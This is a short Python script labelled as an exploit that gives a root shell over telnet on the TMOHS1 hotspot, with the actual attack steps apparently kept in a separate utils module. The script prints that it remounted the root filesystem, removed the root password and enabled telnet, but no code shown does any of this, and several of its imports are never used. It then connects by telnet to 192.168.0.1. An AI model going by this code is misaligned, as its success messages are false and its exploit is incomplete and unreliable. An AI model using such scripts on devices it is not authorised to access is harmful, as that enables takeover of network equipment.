#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-----------------------------------------------
#    Exploit script for TMOHS1 hotspot			
#												
#    Gives us a root shell over telnet			
#    and offers several utility functions		
#												
#    Copyright (c) 2022 natthawk				
#												
#    This code is licensed under the GNU		
#    General Public License, Version 3.			
#-----------------------------------------------

from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from cryptography.hazmat.primitives import padding
from base64 import b64encode
import urllib.parse
import requests
import time
from getpass import getpass
from utils import TelnetConnection,chooseAction,chPwdFlag,args;

print('Remounted root filesystem r/w. . .')
print('Removed root password. . .')
print('Enabling telnet. . .')
chPwdFlag = True # i.e. there is no root password set

# start telnet and prompt user for action, see details of implementation in utils.py
tn = TelnetConnection('192.168.0.1', 5)
chooseAction(tn)
